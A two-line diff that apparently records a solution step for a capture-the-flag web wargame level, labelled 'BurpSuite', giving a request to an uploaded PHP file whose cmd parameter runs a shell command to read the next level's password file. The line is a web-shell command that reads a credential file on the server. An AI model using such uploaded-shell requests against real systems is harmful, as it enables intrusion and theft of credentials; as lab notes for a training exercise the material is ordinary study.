@@ -1,0 +1,2 @@
+# BurpSuite
+/upload/29kj8uog16.php?cmd=cat%20/etc/natas_webpass/natas13
